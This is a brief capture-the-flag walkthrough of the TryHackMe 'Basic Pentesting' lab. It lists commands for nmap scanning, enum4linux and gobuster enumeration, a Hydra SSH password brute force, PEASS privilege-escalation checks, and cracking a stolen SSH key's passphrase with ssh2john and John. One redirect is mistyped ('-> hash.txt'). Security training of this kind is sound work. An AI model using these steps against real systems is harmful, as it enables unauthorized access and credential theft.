 # THM Machine ->  Basic Pentesting 


 ## Step1 : Take a nmap scan 
```
nmap -F -sC -sV -vv -oN report.txt "ip"
```

## Step 2 : Gather Info
Use enum4linux
```
enum4linux -a "ip"
```
Found there are 2 users jan and kay

Use Directory Buster to find the hidden directory
```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u "ip"

```

## Step 3 : Crack the Password 

Use Hydra to crack the password for jan
 ```
 hydra -l jan -P /usr/share/wordlists/rockyou.txt -V ssh:"ip"

```

Once Crack login as Jan

## Step 4 : To become admin

Use the tool PEASS to find vuln in machine
https://github.com/peass-ng/PEASS-ng/releases/tag/20241101-6f46e855

Once found switch directory copy the key (private) and make a txt file with permission 600
->**Kay is admin**

## Step 5 : To become kay 

To login as kay we need password 
but we have the authentication key so using it we will get a passphrase

```
ssh -i id_rsa kay@bproom.com 
```

Now for passphrase as the key we got is encrypted we use **JOHN**
Find John
```
whereis John
```
Go to john directory 
```
ls |grep ssh

```

used to crack ssh encryption


```
python3 /usr/share/john/ssh2john.py id_rsa -> hash.txt

```
used to crack password so john can understand

now
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  
```

This Is used to for getting the passphrase

Now login using the passphrase

we have permission as kay

---
**Room Complete**

